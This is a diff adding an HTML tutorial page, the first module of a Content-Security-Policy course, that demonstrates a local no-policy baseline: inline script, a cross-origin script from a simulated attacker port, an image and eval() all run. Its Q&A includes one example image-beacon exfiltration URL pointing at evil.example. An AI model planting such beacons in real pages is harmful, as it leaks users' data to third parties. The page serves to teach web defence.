@@ -1,0 +1,220 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Module 1 — No-Policy Baseline</title>
+<link rel="stylesheet" href="../../assets/course.css">
+<style>:root { --accent: #58a6ff; }</style>
+</head>
+<body>
+
+<h1><span class="module-kicker">Track 1 · Phase 1 · Module 1</span>No-Policy Baseline</h1>
+
+<h2 id="prereq">00 — Prerequisites</h2>
+<div class="prereq-bar">
+  <span class="prereq-label">You should already know:</span>
+  <a class="tag-link" href="../../prerequisites/01_http_headers_and_origins.html#http-request-response">http-request-response</a>
+  <a class="tag-link" href="../../prerequisites/01_http_headers_and_origins.html#origin-triple">origin-triple</a>
+  <a class="tag-link" href="../../prerequisites/01_http_headers_and_origins.html#same-origin-policy">same-origin-policy</a>
+  <a class="tag-link" href="../../prerequisites/02_dom_sinks.html#eval-sink">eval-sink</a>
+</div>
+
+<h2 id="analogy">01 — The Big Analogy</h2>
+<div class="analogy-box">
+<p>
+Imagine an apartment building with <strong>no front desk, no buzzer system,
+and no locks on any unit door</strong>. Anyone off the street can walk in,
+walk into any apartment, rearrange the furniture, and leave a note taped to
+your fridge. The building isn't "broken" — it was just never built with an
+access-control layer. It does exactly what buildings do (shelter, rooms,
+doors that open) — it simply has zero opinion about who's allowed to do what
+inside it.
+</p>
+<p>
+That's a browser rendering a page with no <code>Content-Security-Policy</code>
+header. HTML parsing, script execution, image loading — every mechanism
+works exactly as designed. There's just no policy layer sitting on top
+saying "only scripts from here," or "no inline handlers." This module is the
+tour of the building before anyone installs a front desk.
+</p>
+</div>
+
+<h2 id="steps">02 — What Happens, Step by Step</h2>
+<ol class="step-list">
+  <li>Browser requests <code>http://localhost:5100/</code>.</li>
+  <li>Server responds <code>200 OK</code> with an HTML body and ordinary headers — no <code>Content-Security-Policy</code> key anywhere.</li>
+  <li>Browser parses the HTML top to bottom. It hits an inline <code>&lt;script&gt;</code> block and runs it immediately (Proof A).</li>
+  <li>Browser hits <code>&lt;script src="http://localhost:5200/attacker.js"&gt;</code>. It opens a <em>new</em> HTTP connection to port 5200 (a different origin), fetches the bytes, and executes them inside the <em>same document</em> it's still parsing (Proof B).</li>
+  <li>Browser hits <code>&lt;img src="http://localhost:5200/pixel.png"&gt;</code>, fetches it from the same different origin, decodes it, and paints it (Proof C).</li>
+  <li>User clicks the button; the click handler calls <code>eval('1 + 1')</code>, which runs as JS and returns <code>2</code> (Proof D).</li>
+</ol>
+
+<h2 id="map">03 — State Map</h2>
+<div class="diagram-frame">
+<svg viewBox="0 0 700 260" xmlns="http://www.w3.org/2000/svg">
+  <g font-family="JetBrains Mono, monospace" font-size="12" fill="#c9d1d9">
+    <rect x="20" y="20" width="280" height="200" rx="8" fill="#161b22" stroke="#58a6ff" stroke-width="2"/>
+    <text x="160" y="42" text-anchor="middle" fill="#fff" font-size="13">localhost:5100 (main)</text>
+    <text x="35" y="70">GET / → 200</text>
+    <text x="35" y="90">headers: content-type, date,</text>
+    <text x="35" y="105">  connection, keep-alive</text>
+    <text x="35" y="105" fill="none"/>
+    <text x="35" y="130" fill="#f85149">NO content-security-policy</text>
+    <text x="35" y="155">inline &lt;script&gt; → runs</text>
+    <text x="35" y="175">eval('1+1') → 2</text>
+    <text x="35" y="195">DOM: fully writable</text>
+
+    <rect x="400" y="20" width="280" height="200" rx="8" fill="#161b22" stroke="#f85149" stroke-width="2"/>
+    <text x="540" y="42" text-anchor="middle" fill="#fff" font-size="13">localhost:5200 (attacker)</text>
+    <text x="415" y="70">GET /attacker.js → 200</text>
+    <text x="415" y="90">GET /pixel.png → 200</text>
+    <text x="415" y="115" fill="#f85149">different origin</text>
+    <text x="415" y="135">(port differs: 5100 vs 5200)</text>
+    <text x="415" y="160">attacker.js executes</text>
+    <text x="415" y="180">  INSIDE port-5100's DOM</text>
+
+    <line x1="300" y1="120" x2="398" y2="120" stroke="#8b949e" stroke-width="2" stroke-dasharray="4,3"/>
+    <text x="349" y="112" text-anchor="middle" font-size="10" fill="#8b949e">script/img fetch</text>
+  </g>
+</svg>
+</div>
+
+<h2 id="code">04 — The Code, Explained</h2>
+<p>The header omission that defines this whole module — <a href="server.js">server.js</a>:</p>
+<pre><code>fs.readFile(filePath, (err, data) => {
+  if (err) { /* ... */ }
+  const ext = path.extname(filePath);
+  // Deliberately: no Content-Security-Policy header is set anywhere
+  // in this module. That is the baseline this module exists to prove.
+  res.writeHead(200, { 'Content-Type': MIME[ext] || 'application/octet-stream' });
+  res.end(data);
+});</code></pre>
+<p>The cross-origin script tag — <a href="public/index.html">public/index.html</a>:</p>
+<pre><code>&lt;!-- Proof B: a &lt;script src&gt; pointed at a DIFFERENT ORIGIN (port 5200). --&gt;
+&lt;script src="http://localhost:5200/attacker.js"&gt;&lt;/script&gt;</code></pre>
+<p>
+Full explanation of every line, with each choice tagged (a)/(b)/(c), lives in
+<a href="DECISIONS.md">DECISIONS.md</a> — this section only shows the two
+excerpts that carry the module's entire point.
+</p>
+
+<h2 id="limits">05 — Limits / What You Cannot Do Yet</h2>
+<div class="compare-box">
+  <div class="cant">
+    <h4>✗ CAN'T DO YET</h4>
+    <ul>
+      <li>Tell the browser "only run scripts I explicitly allow"</li>
+      <li>Block a specific origin from supplying scripts/images</li>
+      <li>Find out <em>after the fact</em> that something was blocked (nothing gets blocked)</li>
+    </ul>
+  </div>
+  <div class="can">
+    <h4>✓ CAN DO</h4>
+    <ul>
+      <li>Observe, with real captured headers, exactly what "no policy" looks like on the wire</li>
+      <li>Reproduce a full unrestricted attack surface on demand, as a fixed baseline</li>
+      <li>Point Module 3 at this exact same app and diff the "after" against it</li>
+    </ul>
+  </div>
+</div>
+
+<h2 id="run">06 — Run It</h2>
+<div class="run-block">
+  <div class="run-label">from track1-csp-core/01_no_policy_baseline/</div>
+  <pre><code>node server.js</code></pre>
+</div>
+<p>Expected terminal output (this is the real output we captured, not a mock-up):</p>
+<div class="run-block">
+  <div class="run-label">stdout</div>
+  <pre><code>[main]     http://localhost:5100  (no CSP header set)
+[attacker] http://localhost:5200  (simulates a different origin)</code></pre>
+</div>
+<p>Open <code>http://localhost:5100</code>. Expected page state after it finishes loading and you click the button:</p>
+<div class="run-block">
+  <div class="run-label">page text (verified)</div>
+  <pre><code>Proof A — inline script executes
+ran — this text was set by an inline &lt;script&gt; block
+
+Proof B — remote script from a different origin (port 5200) executes
+ran — this text was set by a script fetched from http://localhost:5200
+
+Proof C — image from a different origin (port 5200) loads
+loaded, 1x1 px
+
+Proof D — eval() executes arbitrary strings
+eval result: 2</code></pre>
+</div>
+<div class="callout warn">
+  <span class="label">Getting a blank or broken result?</span>
+  If Proof B/C stay stuck on "waiting...", the port-5200 server didn't start —
+  check the terminal for two log lines, not one; `server.js` starts both.
+  If port 5100 or 5200 is already in use on your machine, edit
+  <code>MAIN_PORT</code>/<code>ATTACK_PORT</code> at the top of
+  <code>server.js</code> and update the two URLs in <code>public/index.html</code>
+  and <code>attacker-site/attacker.js</code> to match.
+</div>
+
+<h2 id="exercise">07 — Brain Exercise</h2>
+<details class="exercise-box">
+<summary>Think it through before revealing</summary>
+<p>
+Proof B's script came from a different <em>origin</em> (port 5200) than the
+page that loaded it (port 5100). The Same-Origin Policy is specifically
+designed to stop cross-origin access. So why did <code>attacker.js</code> get
+to write directly into the port-5100 page's DOM without SOP stopping it?
+</p>
+<p><strong>Reveal the answer:</strong></p>
+<p>
+Because SOP restricts <em>a script reading another origin's response data</em>
+(e.g. <code>fetch()</code> can't read another origin's JSON without CORS
+headers) — it does not restrict <em>loading and running</em> a
+<code>&lt;script src&gt;</code> from another origin. Once the browser decides
+to execute those bytes, it executes them <em>as if they were written directly
+into the including document</em>. There is no sandbox boundary at all for
+`&lt;script src&gt;` execution — the origin only mattered for the network
+fetch, not for what the code is allowed to touch afterward. This is precisely
+the gap CSP's <code>script-src</code> directive (Module 3) exists to close.
+</p>
+</details>
+
+<h2 id="qa">08 — There Are No Dumb Questions</h2>
+<div class="qa-item">
+  <div class="q">Q: Isn't "no CSP header" the same as "CSP: allow everything"?</div>
+  <p>Not quite the same framing, though the effect looks similar. There's no policy object being evaluated at all — the browser never asks "is this allowed?" It's not "yes" being returned; the question is never posed. That distinction matters starting Module 8, where you'll see how the browser combines <em>multiple</em> policies — a question that only makes sense once a policy exists to combine.</p>
+</div>
+<div class="qa-item">
+  <div class="q">Q: Why does the image proof matter — isn't an XSS via script the "real" danger?</div>
+  <p>Images seem harmless, but the point of Proof C is narrower: it shows resource loading itself is origin-unrestricted by default. Later, <code>img-src</code> becomes one lever among many, and some real attacks (data exfiltration via image-beacon URLs, e.g. <code>&lt;img src="//evil.example/steal?data=...")</code>) go through exactly this sink.</p>
+</div>
+<div class="qa-item">
+  <div class="q">Q: Could I have proven all this with just one server instead of two?</div>
+  <p>You could prove Proofs A and D with one server. But Proofs B and C specifically need a second <em>origin</em>, and same-origin can't demonstrate a same-origin/cross-origin distinction — you'd just be showing same-origin loading works, which was never in doubt.</p>
+</div>
+<div class="qa-item">
+  <div class="q">Q: Does `eval` in Proof D relate to CSP at all yet?</div>
+  <p>Not yet enforced by anything here — but keep the number in your head. Once Module 3 adds a <code>script-src</code> without <code>'unsafe-eval'</code>, this exact button will start throwing instead of returning 2, and you'll have this run to compare against.</p>
+</div>
+<div class="qa-item">
+  <div class="q">Q: Why 68 bytes for the PNG — is that realistic?</div>
+  <p>No, and it's not supposed to be. It's the smallest byte sequence that is still a real, valid, decodable PNG — chosen so Proof C tests "did a real image byte-stream cross an origin and get painted," not "how fast is our test fixture."</p>
+</div>
+
+<h2 id="next">09 — What's Next</h2>
+<p>
+Module 2 stays entirely inside a Node script, no browser required yet: you'll
+hand-write a parser that turns a raw <code>Content-Security-Policy</code>
+header string — the kind of string you just watched be <em>absent</em> — into
+a directive→source-list data structure. That parser is what Module 3 then
+uses to decide, for real, whether to actually send a blocking policy. Nothing
+in the browser changes yet; Module 2 is where the policy's shape gets nailed
+down before anything starts enforcing it.
+</p>
+
+<div class="module-nav">
+  <div class="prev"><a href="../../prerequisites/index.html">← Prerequisites</a></div>
+  <div class="next"><a href="../02_csp_header_parser/tutorial.html">Module 2: CSP Header Parser →</a></div>
+</div>
+
+<footer class="course-footer">Track 1 · CSP Core Engine · Module 1 of 13</footer>
+</body>
+</html>
